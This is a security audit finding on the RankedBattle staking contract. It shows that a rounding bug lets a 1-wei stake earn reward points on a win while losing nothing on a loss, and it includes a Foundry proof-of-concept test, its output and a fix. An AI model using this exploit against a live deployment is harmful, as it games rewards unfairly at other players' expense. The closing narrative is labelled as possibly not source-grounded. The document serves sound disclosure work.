---
id: 20740
severity: "High"
---

# Malicious user can stake an amount which causes zero curStakeAtRisk on a loss but equal rewardPoints to a fair user on a win

## Description

The [_getStakingFactor()](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L530-L532) function rounds-up the `stakingFactor_` to one if its zero. Additionally, the [_addResultPoints()](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L439) function rounds-down the `curStakeAtRisk`.  
Whenever a player loses and has no accumulated reward points, 0.1% of his staked amount is considered “at risk” and transferred to the `_stakeAtRiskAddress`. However due to the above calculation styles, he can stake just `1 wei` of NRN to have zero `curStakeAtRisk` in case of a loss and in case of a win, still gain the same amount of reward points as a player staking `4e18-1` wei of NRN.   

Let’s look at three cases of a player with ELO as 1500:

Case | Staked NRN | stakingFactor calculated by the protocol | Reward Points accumulated in case of a WIN | NRNs lost (stake at risk) in case of a LOSS  
---|---|---|---|---  
1 | 4 | 2 | 1500 | 0.004  
2 | 3.999999999999999999 | 1 | 750 | 0.003999999999999999  
3 | 0.000000000000000001 | 1 | 750 | 0  
  
As can be seen in Case 2 vs Case 3, a player staking `0.000000000000000001 NRN` (1 wei) has the same upside in case of a win as a player staking `3.999999999999999999 NRN` (4e18-1 wei) while their downside is `0`.

## Proof of Concept

Add the following test inside `test/RankedBattle.t.sol` and run via `forge test -vv --mt test_t0x1c_UpdateBattleRecord_SmallStake` to see the ouput under the 3 different cases:

```solidity
function test_t0x1c_UpdateBattleRecord_SmallStake() public {
    address player = vm.addr(3);
    _mintFromMergingPool(player);
    uint8 tokenId = 0;
    _fundUserWith4kNeuronByTreasury(player);
    
    // snapshot the current state
    uint256 snapshot0 = vm.snapshot();

    vm.prank(player);
    _rankedBattleContract.stakeNRN(4e18, 0);

    console.log("\n\n==================================== CASE 1 ==========================================================");
    emit log_named_decimal_uint("Stats when staked amount =", 4e18, 18);

    // snapshot the current state
    uint256 snapshot0_1 = vm.snapshot();

    vm.prank(address(_GAME_SERVER_ADDRESS));
    _rankedBattleContract.updateBattleRecord(0, 50, 0, 1500, true); // if player had won
    (uint256 wins,,) = _rankedBattleContract.fighterBattleRecord(tokenId);
    assertEq(wins, 1);
    
    console.log("\n----------------------------------  IF WON  ---------------------------------------------------");
    console.log("accumulatedPointsPerFighter =:", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));
    emit log_named_decimal_uint("getStakeAtRisk =", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);
    emit log_named_decimal_uint("_rankedBattleContract NRN balance =", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);
    emit log_named_decimal_uint("_stakeAtRiskContract NRN balance =", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);

    // Restore to snapshot state
    vm.revertTo(snapshot0_1);

    vm.prank(address(_GAME_SERVER_ADDRESS));
    _rankedBattleContract.updateBattleRecord(0, 50, 2, 1500, true); // if player had lost
    (,, uint256 losses) = _rankedBattleContract.fighterBattleRecord(tokenId);
    assertEq(losses, 1);

    console.log("\n----------------------------------  IF LOST  ---------------------------------------------------");
    console.log("accumulatedPointsPerFighter =", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));
    emit log_named_decimal_uint("getStakeAtRisk =", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);
    emit log_named_decimal_uint("_rankedBattleContract NRN balance =", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);
    emit log_named_decimal_uint("_stakeAtRiskContract NRN balance =", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);

    // Restore to snapshot state
    vm.revertTo(snapshot0);

    vm.prank(player);
    _rankedBattleContract.stakeNRN(4e18-1, 0);

    console.log("\n\n==================================== CASE 2 ==========================================================");
    emit log_named_decimal_uint("Stats when staked amount =", 4e18-1, 18);

    // snapshot the current state
    uint256 snapshot1_1 = vm.snapshot();

    vm.prank(address(_GAME_SERVER_ADDRESS));
    _rankedBattleContract.updateBattleRecord(0, 50, 0, 1500, true); // if player had won
    (wins,,) = _rankedBattleContract.fighterBattleRecord(tokenId);
    assertEq(wins, 1);
    
    console.log("\n----------------------------------  IF WON  ---------------------------------------------------");
    console.log("accumulatedPointsPerFighter =:", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));
    emit log_named_decimal_uint("getStakeAtRisk =", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);
    emit log_named_decimal_uint("_rankedBattleContract NRN balance =", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);
    emit log_named_decimal_uint("_stakeAtRiskContract NRN balance =", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);

    // Restore to snapshot state
    vm.revertTo(snapshot1_1);

    vm.prank(address(_GAME_SERVER_ADDRESS));
    _rankedBattleContract.updateBattleRecord(0, 50, 2, 1500, true); // if player had lost
    (,, losses) = _rankedBattleContract.fighterBattleRecord(tokenId);
    assertEq(losses, 1);

    console.log("\n----------------------------------  IF LOST  ---------------------------------------------------");
    console.log("accumulatedPointsPerFighter =", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));
    emit log_named_decimal_uint("getStakeAtRisk =", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);
    emit log_named_decimal_uint("_rankedBattleContract NRN balance =", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);
    emit log_named_decimal_uint("_stakeAtRiskContract NRN balance =", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);

    // Restore to snapshot state
    vm.revertTo(snapshot0);

    vm.prank(player);
    _rankedBattleContract.stakeNRN(1, 0);

    console.log("\n\n==================================== CASE 3 ==========================================================");
    emit log_named_decimal_uint("Stats when staked amount =", 1, 18);

    // snapshot the current state
    uint256 snapshot2_1 = vm.snapshot();

    vm.prank(address(_GAME_SERVER_ADDRESS));
    _rankedBattleContract.updateBattleRecord(0, 50, 0, 1500, true); // if player had won
    (wins,,) = _rankedBattleContract.fighterBattleRecord(tokenId);
    assertEq(wins, 1);
    
    console.log("\n----------------------------------  IF WON  ---------------------------------------------------");
    console.log("accumulatedPointsPerFighter =:", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));
    emit log_named_decimal_uint("getStakeAtRisk =", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);
    emit log_named_decimal_uint("_rankedBattleContract NRN balance =", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);
    emit log_named_decimal_uint("_stakeAtRiskContract NRN balance =", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);

    // Restore to snapshot state
    vm.revertTo(snapshot2_1);

    vm.prank(address(_GAME_SERVER_ADDRESS));
    _rankedBattleContract.updateBattleRecord(0, 50, 2, 1500, true); // if player had lost
    (,, losses) = _rankedBattleContract.fighterBattleRecord(tokenId);
    assertEq(losses, 1);

    console.log("\n----------------------------------  IF LOST  ---------------------------------------------------");
    console.log("accumulatedPointsPerFighter =", _rankedBattleContract.accumulatedPointsPerFighter(0, 0));
    emit log_named_decimal_uint("getStakeAtRisk =", _stakeAtRiskContract.getStakeAtRisk(tokenId), 18);
    emit log_named_decimal_uint("_rankedBattleContract NRN balance =", _neuronContract.balanceOf(address(_rankedBattleContract)), 18);
    emit log_named_decimal_uint("_stakeAtRiskContract NRN balance =", _neuronContract.balanceOf(address(_stakeAtRiskContract)), 18);
}
```

Output:

```
==================================== CASE 1 ==========================================================
  Stats when staked amount =: 4.000000000000000000

----------------------------------  IF WON  ---------------------------------------------------
  accumulatedPointsPerFighter =: 1500
  getStakeAtRisk =: 0.000000000000000000
  _rankedBattleContract NRN balance =: 4.000000000000000000
  _stakeAtRiskContract NRN balance =: 0.000000000000000000

----------------------------------  IF LOST  ---------------------------------------------------
  accumulatedPointsPerFighter = 0
  getStakeAtRisk =: 0.004000000000000000
  _rankedBattleContract NRN balance =: 3.996000000000000000
  _stakeAtRiskContract NRN balance =: 0.004000000000000000

==================================== CASE 2 ==========================================================
  Stats when staked amount =: 3.999999999999999999

----------------------------------  IF WON  ---------------------------------------------------
  accumulatedPointsPerFighter =: 750
  getStakeAtRisk =: 0.000000000000000000
  _rankedBattleContract NRN balance =: 3.999999999999999999
  _stakeAtRiskContract NRN balance =: 0.000000000000000000

----------------------------------  IF LOST  ---------------------------------------------------
  accumulatedPointsPerFighter = 0
  getStakeAtRisk =: 0.003999999999999999
  _rankedBattleContract NRN balance =: 3.996000000000000000
  _stakeAtRiskContract NRN balance =: 0.003999999999999999

==================================== CASE 3 ==========================================================
  Stats when staked amount =: 0.000000000000000001

----------------------------------  IF WON  ---------------------------------------------------
  accumulatedPointsPerFighter =: 750
  getStakeAtRisk =: 0.000000000000000000
  _rankedBattleContract NRN balance =: 0.000000000000000001
  _stakeAtRiskContract NRN balance =: 0.000000000000000000

----------------------------------  IF LOST  ---------------------------------------------------
  accumulatedPointsPerFighter = 0
  getStakeAtRisk =: 0.000000000000000000
  _rankedBattleContract NRN balance =: 0.000000000000000001
  _stakeAtRiskContract NRN balance =: 0.000000000000000000
```

## Recommendation

Protocol can choose to set a minimum stake amount of `4 NRN` _(4e18 wei)_. One needs to take care that even after a partial unstake, this amount is not allowed to go below `4 NRN`.   
Also, do not round up `stakingFactor_` i.e. remove [L530-L532](https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L530-L532). An additional check can be added too which ensures that `stakingFactor_` is greater than zero:

```solidity
File: src/RankedBattle.sol

519:              function _getStakingFactor(
520:                  uint256 tokenId, 
521:                  uint256 stakeAtRisk
522:              ) 
523:                  private 
524:                  view 
525:                  returns (uint256) 
526:              {
527:                uint256 stakingFactor_ = FixedPointMathLib.sqrt(
528:                    (amountStaked[tokenId] + stakeAtRisk) / 10**18
529:                );
- 530:                if (stakingFactor_ == 0) {
- 531:                  stakingFactor_ = 1;
- 532:                }
+ 532:                require(stakingFactor_ > 0, "stakingFactor_ = 0");
533:                return stakingFactor_;
534:              }    
```

The above fixes would ensure that `curStakeAtRisk` can never be gamed to 0 while still having a positive reward potential.  
It’s may also be a good idea to have a provision to return any “extra” staked amount. For example, if only 4 NRN is required to achieve a stakingFactor of 1 and the player stakes 4.5 NRN, then the extra 0.5 NRN could be returned. This however is up to the protocol to consider.

Strategic dodging to avoid penalty. Might as well fully unstake to make curStakeAtRisk 0. However, points would be zero if at risk penalty were to kick in.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a rounding precision bug that creates an asymmetric reward‑penalty relationship in the staking logic of the RankedBattle contract. The function that calculates the staking factor rounds a zero result up to one, while the function that determines the current stake at risk rounds the value down. When a user stakes an extremely small amount – for example one wei of the NRN token – the square‑root based staking factor evaluates to zero, is forced to one, and the subsequent calculation of curStakeAtRisk is rounded down to zero. As a result the user’s stake at risk becomes zero on a loss, meaning no tokens are transferred to the risk address, yet the same user receives the full amount of reward points that a normal participant would earn for a win. This discrepancy allows a malicious participant to accumulate ranking points without any financial exposure, effectively gaming the ELO system and undermining the economic incentives of the protocol. The issue manifests only for tiny stake amounts that are below the precision threshold of the fixed‑point arithmetic (less than 1e18 wei), which makes it easy to overlook during casual testing. It was discovered during a formal audit when test cases compared three staking scenarios and observed that a 1‑wei stake yielded the same reward points as a near‑full 4‑NRN stake while incurring no loss on defeat. The bug is hard to notice because the rounding logic appears harmless and small‑stake transactions are uncommon, so the zero‑loss outcome does not raise immediate alarms. The impact is that an attacker can inflate their reward points and potentially manipulate rankings or earn disproportionate rewards without risking capital, which can distort competition and reduce confidence in the protocol’s fairness. The affected parties include any user who can submit a stake, the protocol’s ranking mechanism, and any downstream contracts that rely on the integrity of reward distribution. To remediate, the contract should enforce a minimum stake amount (e.g., 4 NRN) and remove the artificial rounding‑up of the staking factor, instead requiring the computed factor to be strictly greater than zero. Additionally, the calculation of curStakeAtRisk must guarantee a non‑zero value whenever reward points are awarded, and any excess stake beyond the minimum could be returned to the user. These changes close the rounding loophole and restore a balanced risk‑reward model.
